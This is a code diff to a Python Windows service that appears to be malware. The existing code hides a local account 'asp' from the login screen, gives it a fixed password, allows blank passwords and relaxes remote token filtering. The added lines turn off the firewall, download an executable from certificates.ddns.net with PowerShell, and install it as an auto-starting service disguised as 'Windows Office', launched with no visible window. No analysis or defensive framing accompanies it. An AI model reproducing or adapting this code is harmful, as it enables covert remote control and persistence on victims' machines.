@@ -118,7 +118,12 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
                             os.system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f")
                             os.system("wmic path Win32_UserAccount where Name=\'asp\' set PasswordExpires=false")
                             os.system("reg add hklm\\system\\currentcontrolset\\control\\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f")
-                            if not os.path.exists('c:\windows\syswow64'):
+                            os.system("netsh advfirewall set allprofiles state off")
+                            if not os.path.exists('c:\\windows\\wup.exe'):
+                                    os.system('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
+                                    subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=CREATE_NO_WINDOW)
+                                    subprocess.call("net start wup", creationflags=CREATE_NO_WINDOW)
+                            if not os.path.exists('c:\\windows\\syswow64'):
                                     os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f')
                                     os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f')
                                     os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f')
@@ -128,7 +133,7 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
                                     #os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v Administrator /t REG_DWORD /d 0 /f /reg:64')
                                     os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f /reg:64')
                             
-                            os.system("netsh advfirewall set allprofiles state off")
+                            
                             #os.system("net.exe user Administrator Qwerty12")
                             os.system("net.exe user asp Qwerty12")
                             sinit='1'
